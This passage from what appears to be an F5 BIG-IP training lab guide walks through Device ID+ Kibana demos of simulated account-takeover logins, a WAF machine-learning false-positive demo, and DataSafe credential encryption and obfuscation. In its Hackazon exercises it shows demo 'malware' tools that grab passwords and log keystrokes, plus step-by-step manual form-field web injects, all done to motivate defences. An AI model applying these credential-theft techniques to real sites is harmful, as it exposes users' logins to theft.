4. Klick the Button left to “Home”. Within the Kibana Section you can choose between Discover or Dashboard.

![img_class3_module2_animated_7](https://user-images.githubusercontent.com/51786870/211326161-40eb1e8a-03a2-492f-b2c6-f3a0bc98c43e.gif)

**Note**

`Within the Dashboard you will find pre-configured Visualizations. The Dashboard has only a limited space in terms of sizing. In case you want to anaylses a specific Visualization, use the function called Maximize Panel.`

![img_class3_module2_animated_7a](https://user-images.githubusercontent.com/51786870/211326234-1b26be56-843e-41ca-a414-12a605e87338.gif)


### Demo Use Cases - Single Device accessing unauthorized accounts

Within here we will Demo sudden fluctuations in Users per DeviceID.

![image](https://user-images.githubusercontent.com/51786870/211326337-a3e494e7-7186-4a34-af4c-487ff674ea53.png)

1. Launch Chrome and discover the browser and access the bookmark called Device ID check. This will launch the Arcadia Application.

2. Navigate to the Login section of the Application.

3. Try to login with different random Username.

![img_class3_module2_animated_8](https://user-images.githubusercontent.com/51786870/211326456-bd8863f3-f6bc-4691-a074-7e8c7ab30a64.gif)

4. Go back to **Device ID+ Kibana** and select **Dashboard**.

5. Here you will see that a single Device (single **Device ID Type A** and **Type B**) tried to access the App with differnet Username.

![img_class3_module2_animated_9](https://user-images.githubusercontent.com/51786870/211326575-9a69f941-ddea-4a32-9a1a-9b320aec174f.gif)

6. If you like to test it with **Postman**, open **Postman**, start **New Runner Tab** by navigating to the **File Menu** of Postman.

7. From Runner drag the collection Device ID+ ELK into the Field RUN ORDER.

8. Choose the Source Data File named Demo_1.csv by using the select file menu.

9. Via preview check which Data we will Post via Runner to login page of Arcadia Application.

10. Now Press Run Device ID+ ELK in Runner.

![img_class3_module2_animated_10](https://user-images.githubusercontent.com/51786870/211326746-32b62001-ef4a-4911-84cc-058916bcd6f1.gif)


### Demo Use Cases - Deliberate use of proxy networks

Within that use case you will cover a single Device accessing unauthorized accounts from different Source IPs.

![img_class3_module2_static_7](https://user-images.githubusercontent.com/51786870/211326842-04f96ee2-1cdf-4334-a7b1-ecaf329fc65e.png)

You will use Postman Runner to simulate 10 Request with 10 different Username using 10 different IPs but the same Device ID.

![img_class3_module2_static_8](https://user-images.githubusercontent.com/51786870/211326910-3d9933b5-a20d-48c4-a008-aa0c64299b56.gif)

1. Open Postman, start New Runner Tab by navigating to the File Menu of Postman.

2. From Runner drag the collection Device ID+ ELK into the Field RUN ORDER.

3. Choose the Source Data File named Demo_2.csv by using the select file menu.

4. Via preview check which Data we will Post via Runner to login page of Arcadia Application.

5. Now Press Run Device ID+ ELK in Runner.

![img_class3_module2_animated_11](https://user-images.githubusercontent.com/51786870/211327024-66f6ade5-afbf-4ed0-ac89-638c36658521.gif)

6. Go back to your Kibana Dashboard.

7. Within here you see again there is only one Device ID Type A / Device ID Type B identifier generated.

8. The requests coming from 10 different geo locations.

9. Ten Usernames have been used with one Device ID Type A / Device ID Type B to logon to the page.

![img_class3_module2_animated_12](https://user-images.githubusercontent.com/51786870/211327098-582a4f90-fb7b-461b-b564-25102b6e4d58.gif)

### Demo Use Cases - Unusual Devices accessing user accounts

Within this Demo we will use Postman Runner to simulate requests coming from different devices sitting behind a proxy network. The Source IP will be the same however, the Device ID Type A / Device ID Type B will change on the malicious request. You´ll also see valid request coming from username xyzgood.

![image](https://user-images.githubusercontent.com/51786870/211327156-0ed0620b-ed0d-4e38-805d-e7bfad7dd683.png)

1. Open Postman, start New Runner Tab by navigating to the File Menu of Postman.

2. From Runner drag the collection Device ID+ ELK into the Field RUN ORDER.

3. Choose the Source Data File named Demo_3.csv by using the select file menu.

4. Via preview check which Data we will Post via Runner to login page of Arcadia Application.

5. Now Press Run Device ID+ ELK in Runner.

6. Go back to your Kibana Dashboard.

7. Within here you see that various Device ID Type A / Device ID Type B have been generated by a single IP.

![img_class3_module2_animated_13](https://user-images.githubusercontent.com/51786870/211327268-0c25d4f6-46a0-47a2-bae5-734657dfd265.gif)

8. If you invest further, you´ll see potential valid requets as these coming from a unique User by a Unique IP generating a single Device Identifier.

9. On the other hand you see differnt Device Identifier been generated by the same IP using random Usernames.

![img_class3_module2_animated_14](https://user-images.githubusercontent.com/51786870/211327319-6efc1b8d-ca93-4b08-a993-641b33601d8c.gif)



# Class 3 Module 3
# Module 3: Offline Machine Learning

The goal of this lab is to check how Machine Learning feature within AWAF policy works.

1. Go to Security  ››  Application Security : Security Policies : Policies List and check if OfflineMachineLearningDemo policy is in blocking mode

![image](https://user-images.githubusercontent.com/51786870/211330998-ad6817a3-cbb7-465e-87a8-1caf7c81973c.png)

2. Go to **Security  ››  Application Security : Policy Building : Learning and Blocking Settings** of this policy and check if under "**learning and blocking settings**" - "**Attack Signatures" - Potential False Positive Detection** is set to "**disabled**"

3. Go to https://www.providence.org/. This is configured as a virtual server on BIG-IP with the IP address of 10.1.10.66.

![image](https://user-images.githubusercontent.com/51786870/211332931-c78b7708-d7df-439d-991e-0a4aff48448c.png)

![image](https://user-images.githubusercontent.com/51786870/211333069-c73c8750-9718-4132-93ec-aefc9f3d8f00.png)

4. When you will be notified with the screen below just enter "thisisunsafe" in the browser window

![image](https://user-images.githubusercontent.com/51786870/211331909-d4993ecb-f18f-410d-b994-4a3ec14ed51e.png)

5. After that you should see the information from the application

![image](https://user-images.githubusercontent.com/51786870/211333155-75f02d66-e7a8-4299-b527-cb68f1dc6510.png)

**If not working, create the virtual server with settings like in vs_Offline_Machine_Learning on 10.1.10.66:443 with AutoMap enabled and client and server ssl profiles with pool washington.providence.org**

6. Open the "Machine Learning" tab and select the Benign request to www.providence.org bookmark.	The benign request is blocked.

![image](https://user-images.githubusercontent.com/51786870/211333736-a9c0542f-343c-439b-8f50-9ca631065d5c.png)

7. Enable the ML model in " learning and blocking settings" - "Attack Signatures" and set "Potential False Positive Detection" to "Detect and allow"

![image](https://user-images.githubusercontent.com/51786870/211333929-c325aebb-467e-4b35-875b-ab63b2dbd964.png)

8. Send the same benign request and it should be allowed

![image](https://user-images.githubusercontent.com/51786870/211334000-00369b27-cce0-43bd-b163-7893ea727c7a.png)

You can see the message below.

![image](https://user-images.githubusercontent.com/51786870/211334139-ec2a2e0e-58bf-4d23-a903-bf4e6e8b2d25.png)

If yes, please copy and paste below link

https://www.providence.org/~/link.aspx?_id=69039ACAAE934B429F35563EF5DCDBAC&_z=z

**This concludes the lab**


# Class 3 Module 4
# Module 4: Protecting Credentials with DataSafe

The purpose of this lab is to show the how DataSafe works. You will review the login page with and without DataSafe protections. You will enable and test encryption, obfuscation, and decoy fields.

**Note**

The Lab is already pre-build. Meaning, you can show/check and demo encryption and obfuscation for password field with help of Datasafe without configuring anything. If you plan to demo from scratch, please go to Exercise 1 – TASK 1 - Review and Attack the Login Page and follow the instructions.

**Demo Protecting Credentials with F5 DataSafe - pre-configured**

**Note**

1. Connect to the Windows Client (win-client) via RDP (Select an appropriate screen resolution for your screen) ensuirng that you login with username/password as user/user.

2. Start Chrome and click bookmark Hackazon Login or Hackazon Home

3. Move cursor to the password field, right click and select Inspect.

4. You can see obfuscation (password field name changing every 5 seconds).

5. Next go to tab Network in Developers tools.

6. Login into Hackazon with username/password as demo1 /demo1

7. Check encryption and obfuscation for password field.

![img_class3_module4_animated_1](https://user-images.githubusercontent.com/51786870/211343060-533b3131-67df-45df-a0dd-3ba51326bfb8.gif)


### Exercise 1 – TASK 1 - Review and Attack the Login Page

Purpose: Review **Form Fields** with the Developer Tools of your Browser.

1. Datasafe is configured on BIG-IP named BIG-IP 16.1 - All Demos.

2. Login to BIG-IP via WebUI and detach the DataSafe Profile from **Virtaul Server Local Traffic  ››  Virtual Servers : Virtual Server List  ››  vs_Hackazon_II**.

![image](https://user-images.githubusercontent.com/51786870/211343377-7e726427-3e9b-4446-b964-4db1a47e8477.png)

3. Connect to the Windows Client (win-client) via RDP (Select an appropriate screen resolution for your screen) ensuirng that you login with username/password as **admin/admin** (change user from default Administrator if required on the logon prompt screen).

4. Once connected to the Windows client, open Firefox and access Hackazon Login Bookmark. If there is no bookmark for logonpage please go to http://hackazon.f5demo.com/user/login


5. Right-click inside the field called Username or Email and select Inspect Element. The developer tools window will open.

**Question**

`What is the name value for this fieldc alled Username or Email? username`

6. Right-click inside the field called Password and select Inspect Element.

**Question**:

`What is the name value for this field called Password? password`

**Note**

`FOOD FOR THOUGHT: How difficult would it be for malware to know which fields to grab to steal credentials from this page? How difficult would it be for an attacker to stuff credentials into these fields? They could simply put the stolen username into the “username” field and the stolen password in the “password” field.`


### Exercise 1 – TASK 2 - Review Methods for Stealing Credentials

1. From the Windows client, in Firefox click the FPS Demo Tools Bookmark, without opening a new tab. This includes tools that behave like real malware.

2. On the login page of the Hackazon website enter your first name and P@ssw0rd! as password but do not click Sign In.

3. From the Demo Tools click Steal Password and then click on the password field.

**Note**

`The “malware” is using JavaScript to grab the value of the password field out of the DOM (DocumentObject Model) even before the user submits it to the application.`

4. Click OK then clear the password you entered.

5. From the Demo Tools click Start Keylogger and then enter the same password as earlier.

6. Watch the top of the Demo Tools.

7. The “malware” is using JavaScript to log the password as it is typed. It could also send this capture data to some malicious site.

8. In the developer tools window that opened previously, select the Network tab (F12), then click the trash can icon to delete the requests.

9. On the login page enter your first name as username and P@ssw0rd! as password and click Sign In.

**Note**

`Your login will fail, but your credentials were still sent to the web server.`

10. In the Network tab select the **/login?return_url=** entry, and then examine the Params tab.

![image](https://user-images.githubusercontent.com/51786870/211344695-f340c3f7-3471-4468-8ef1-97881290b6bd.png)

11. The user’s credentials are visible in clear text.

12. This is another way that malware can steal credentials. By “grabbing” the POST request and any data sent with it, including username and password.


### Exercise 1 – TASK3 – Perform a Form Field ``Web Inject``

1. Return to the Hackazon — Login page.

**Note**

`It should NOT have ?return_url= at the end of the URL in the address bar.`

2. Right-click inside the **Username** or **Email** field and select **Inspect Element** again.

3. Right-click on the blue highlighted text in the developer tools window that opens and select **Edit as HTML**.

4. Select all the text in the window and type Ctrl+C to copy the text.

5. Click after the end of data-bv-field=”username”> and type <br>, and then press the Enter key twice.

6. Type Ctrl+V to paste the copied text.

7. For the new pasted entry, change the name, id, and data-by-field values to mobile, and change the placeholder value to Mobile Phone Number.

8. Click outside of the edit box and examine the Hackazon login page.

![img_class3_module4_animated_2](https://user-images.githubusercontent.com/51786870/211346108-65845486-df4a-4f7c-bc95-2db8779ea923.gif)

**Note**

`This is an example of the type of “web injects” that malware can perform to collect additional information. This same technique could be used to remove text or form fields. Note that this was done on the client side, in the browser, without any requests being sent to the server. The web application and any security infrastructure protecting it would have no idea this is happening in the browser.`

9. Close Firefox.

### Exercise 2 – TASK1 – Review and Configure DataSafe Components

Within the exercise we will cover DataSafe Licensing and Provisioning.

1. Datasafe is configured on BIG-IP.

2. In the Configuration Utility of the BIG-IP (connect via Chrome Bookmark or launch https://10.1.1.9/tmui/login.jsp ).

3. The Password of the BIG-IP instance is listed within the Details / Documentation Tab.

**Note**

`DataSafe is included in the Best Bundle together with Advanced WAF.`

4. Open the **System > Resource Provisioning** page

![image](https://user-images.githubusercontent.com/51786870/211349525-72a6d060-a329-4a30-aea0-75d014a2cd78.png)


### Exercise 2 – TASK2 – DataSafe Configuration

1. Open the **Security > Data Protection > DataSafe Profiles** page on the BIG-IP and click Create.

2. For Profile Name enter **Hackazon-DS**.

**Note**

`If the Hackazon-DS profile already exists, please delete and follow instructions here.`

3. For Local Syslog Publisher, select local-datasafe (select the checkbox on the right side to enable.

4. Optional: The local-datasafe Publisher can be viewed at System -> Logs -> Configuration -> Log Publishers.

![image](https://user-images.githubusercontent.com/51786870/211350076-fb38c400-1ede-4d47-94f4-873d1851b462.png)

5. Click in Advanced and review all other options Data Safe will serve different Javascript files under those configured HTTP paths.

6. On the left menu click URL List, and then click Add URL.

![image](https://user-images.githubusercontent.com/51786870/211350184-016bab18-6746-4f5b-936f-a855bc78dddb.png)

7. For **URL Path** leave **Explicit** selected, and type **/user/login**.

![image](https://user-images.githubusercontent.com/51786870/211350304-68950e26-9848-46f9-b8fa-6e1c0fa19d16.png)

8. Click in Advanced and review all other options. Various configurations refer to where Data Safe will inject its Javascript.

9. From the left panel open the Parameters page. Remember from earlier you found that the username and password parameter names are username and password.

10. Click Add, enter a new parameter named username, select Identify as Username and then click Repeat.

11. Create a second parameter named password, and then click Create.

12. For the username parameter select the Obfuscation checkbox.

13. For the password parameter select the Encrypt, Substitute Value, and Obfuscate checkboxes.

![image](https://user-images.githubusercontent.com/51786870/211350396-0ba160da-f711-4be2-8b5c-40ce89d7b32b.png)

14. From the left menu open the Application Layer Encryption page.


**Note**

`Notice that most features are enabled by default.`

15. Review the explanations for the different features.

16. Select the Add Decoy Inputs checkbox

17. Expand the Advanced section and select Remove Element IDs checkbox, and then click Save.

![image](https://user-images.githubusercontent.com/51786870/211350547-ec3f3e5e-6f7a-45fd-a997-d4a9a9cf1b63.png)

18. Click Save to save the new profile

19. Navigate to Security ›› Event Logs : Logging Profiles and select the ‘ASM-Bot-DoS-Log-All’ log profile.

20. Ensure Data Protection is enabled.

21. Once enabled, click on the Data Protection tab and ensure the local-datasafe is selected from the dropdown of the Publisher section.

22. Enable Login Attempt and select the default template. Click Update.

![image](https://user-images.githubusercontent.com/51786870/211350687-088fd0e9-08e6-4e34-945d-7570172d533d.png)

23. Navigate to Local Traffic ›› Virtual Servers ›› Virtual Server List page and click Hackazon_protected_virtual, and then open the virtual server Security > Policies page.

24. From the DataSafe Profile list select Enabled.

25. From the adjacent Profile list box that appears, select Hackazon-DS, and then click Update.


**Note**

`The ASM-Bot-DoS-Log-All log profile will be applied already.`

![image](https://user-images.githubusercontent.com/51786870/211350953-8df0db7d-e28d-4ba0-9084-c8c286951a61.png)

### Exercise 3 – TASK1 – Testing DataSafe Protection

Review the Protected Hackazon Login Page

1. From your Windows client, open a private Firefox window and access http://hackazon.f5demo.com/user/login.

2. Right-click inside the Password field and select Inspect Element.

**Question**

   * What is the name value for this field?

![image](https://user-images.githubusercontent.com/51786870/211351122-51178b90-37a9-4977-bff2-8ae2f1b31008.png)

   * Obfuscation - Notice that the name of the password field (outlined in red) is now a long cryptic name and is changing every second. The same is true of the username field. Perform the same for the username field.

   * Add Decoy Inputs – Notice that there are other random inputs being added (outlined in green). The number and order of these inputs is changing frequently.

**Note**

`FOOD FOR THOUGHT: Considering this obfuscation, do you think DataSafe could protect the login page from a credential stuffing or a regular brute force?`

3. In the developer tools window select the Network tab, then click the trash can icon to delete any current requests.

4. On the login page enter your first name as username and P@ssw0rd! as password and click Sign In.

5. In the Network tab select the /login?return_url= entry, and then examine the Params tab.

**Question**

   * What parameters were submitted? Random

   * Do you see a username or password field? Not really

   * Do you see the username you submitted? Yes

   * Obfuscation – DataSafe obfuscates the names of the parameters when they are submitted in a login request.

   * Encryption – DataSafe encrypted the value of the password field so that it is not a readable value in the login request.

**This concludes Class 3**
